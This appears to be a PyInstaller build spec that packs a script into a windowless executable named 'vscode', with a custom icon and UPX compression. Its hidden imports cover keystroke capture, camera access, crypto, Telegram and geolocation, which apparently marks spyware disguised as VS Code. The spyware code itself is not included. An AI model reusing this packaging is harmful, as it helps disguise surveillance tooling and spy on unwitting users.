# -*- mode: python ; coding: utf-8 -*-


a = Analysis(
    ['2.py'],
    pathex=[],
    binaries=[],
    datas=[],
    hiddenimports=['pynput', 'cv2', 'Crypto', 'telegram', 'asyncio', 'winsdk', 'winsdk.windows.devices.geolocation'],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    noarchive=False,
    optimize=0,
)
pyz = PYZ(a.pure)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name='vscode',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon=['IconGroup1.ico'],
)
